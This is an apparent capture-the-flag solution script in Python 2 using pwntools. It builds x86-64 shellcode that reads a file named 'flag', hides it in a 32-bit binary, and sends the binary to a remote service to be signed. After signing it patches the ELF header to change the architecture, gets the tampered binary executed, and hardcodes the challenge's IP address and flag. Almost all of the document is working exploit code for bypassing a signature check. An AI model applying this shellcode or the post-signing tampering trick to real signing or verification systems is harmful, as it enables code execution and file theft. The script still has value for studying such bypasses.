import os
from pwn import *
from elftools.elf.elffile import ELFFile

context.arch = 'amd64'
context.log_level = 'debug'

ip = '100.26.214.14'

def sign_binary(elf):
    #p = process(['python','app.py'])
    p = remote(ip,9001)

    p.readuntil('part 1:')
    p.sendline('flag{polymorphic virus beats static av every time}')

    print p.readuntil('>')
    p.sendline('1')
    print p.readuntil('size:')

    with open(elf, 'rb') as f:
        data = f.read()

    p.sendline(str(len(data)))
    print p.readuntil('data:')
    p.send(data)

    print p.readuntil('Signed ELF Size: ')
    size = int(p.readuntil('\n')[:-1])

    print p.readuntil('Signed ELF Data: ')
    data = ''
    to_read = size
    while (to_read > 0):
        data += p.read(to_read)
        to_read = size - len(data)


    with open(elf, 'wb') as f:
        f.write(data)

    p.close()

def run_binary(elf):
    #p = process(['python','app.py'])
    p = remote(ip,9001)

    p.readuntil('part 1:')
    p.sendline('flag{polymorphic virus beats static av every time}')

    p.readuntil('>')
    p.sendline('2')
    p.readuntil('size:')

    with open(elf, 'rb') as f:
        data = f.read()

    p.sendline(str(len(data)))
    p.send(data)

    p.interactive()

def run_bytes(b):
    if len(b) > 4:
        raise Exception("More than 4 bytes")
    return '49B848474645909090b8'.decode('hex') + b.ljust(4,'\x90')


def push_string(s):
    s += '\0'
    if len(s) % 2 == 1:
        s += '\0'

    s = s[::-1]

    if len(s) > 8:
        raise Exception("String too long")

    sc = ['xor eax,eax']
    for i in range(0,len(s),2):
        v = u16(s[i+1] + s[i])
        if i != 0:
            sc += ['shl rax, 16']
        if v != 0:
            sc += ['mov ax, %u'%v]
    sc += ['push rax']
    return sc


sc = push_string('flag')
sc += [
    'mov rdi, rsp',
    'xor eax,eax; mov al, 2',
    'syscall',
    'xchg rdi, rax',
    'xchg rsi, rax',
    'mov dx, 40',
    'syscall',
    'xor rdi, rdi',
    'inc rdi',
    'xor eax,eax; inc eax',
    'syscall',
    'int3'
]
print sc

o = ''
for i in sc:
    print i
    o += run_bytes(asm(i))
o += '\xcc'

print o.encode('hex')

with open('sol.c','w') as f:
    f.write('void _start() { asm("' + 'nop;'*len(o)+'"); }')
os.system('./gcc-sig.sh -o sol sol.c -m32')

with open('sol', 'rb') as f:
    elf = ELFFile(f)

    for sec in elf.iter_sections():
        if sec.name != '.text':
            continue
        off = sec.header.sh_offset
        text_len = len(sec.data())

with os.fdopen(os.open('sol', os.O_RDWR | os.O_CREAT), 'rb+') as f:
    f.seek(off)
    f.write(o.ljust(text_len, '\xcc'))

sign_binary('./sol')

with os.fdopen(os.open('sol', os.O_RDWR | os.O_CREAT), 'rb+') as f:
    f.seek(0x12)
    f.write('\x3e')

run_binary('./sol')

